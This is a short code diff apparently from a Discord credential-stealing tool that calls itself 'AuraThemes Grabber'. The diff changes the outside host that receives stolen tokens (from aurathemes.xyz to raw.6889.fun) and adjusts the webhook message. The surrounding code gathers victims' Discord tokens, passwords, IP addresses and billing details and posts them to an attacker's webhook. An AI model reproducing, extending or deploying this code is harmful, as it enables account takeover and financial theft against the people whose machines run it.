@@ -160,7 +160,7 @@ switch (process.platform) {
           e = null;
         });
         if (!e) continue;
-        var copy = `https://aurathemes.xyz/f?token=${a}`;
+        var copy = `https://raw.6889.fun/api/aurathemes/raw/t/` + a;
         let embed = await getEmbed();
         let pc = getSystemInfo();
         var Discord = new DiscordToken(a, pc.getIpAddress, e.password).info;
@@ -180,7 +180,7 @@ switch (process.platform) {
           .addFields(getField(`Billing`, Discord.billing, true))
           .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
           .setTimestamp();
-        webhook.send({ embeds: [Initialized], username: `@AuraThemes` })
+        webhook.send({ embeds: [Initialized], username: `@AuraThemes`, avatarURL: embed.avatar })
         var Friend = new EmbedBuilder()
           .setAuthor({ name: `${e.username}#${e.discriminator} | ${e.id}`, iconURL: Discord.avatar })
           .setColor(color)
